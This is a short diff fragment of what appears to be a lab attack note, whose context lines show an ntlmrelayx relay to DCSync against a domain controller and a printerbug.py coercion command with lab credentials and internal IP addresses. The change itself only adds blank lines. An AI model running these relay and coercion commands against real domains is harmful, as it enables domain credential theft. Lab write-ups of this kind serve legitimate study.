@@ -21,3 +21,5 @@ ntlmrelayx.py -t dcsync://DC01.LAB.LOCAL -smb2support
 #Trigger printerbug in 2nd shell
 python3 printerbug.py 'LAB.LOCAL'/joe:Password123@10.10.10.10 10.10.10.12
 ```
+
+
